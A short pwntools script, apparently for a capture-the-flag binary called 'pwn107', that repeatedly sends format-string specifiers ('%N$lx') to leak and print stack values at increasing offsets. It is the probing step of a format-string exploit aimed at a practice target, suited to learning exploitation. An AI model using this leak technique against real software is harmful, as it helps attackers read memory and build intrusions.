from pwn import *

# Set up the process to interact with
process_name = './pwn107'
start = 6

for _ in range(64):
    p = process(process_name)
    payload = "%{}$lx.%{}$lx.%{}$lx".format(start, start + 1, start + 2)
    p.sendline(payload)
    p.recvuntil('Your current streak: ')
    output = p.recvline().decode().strip()
    print(f"{start}: {output} ")
    p.close()
    start += 3
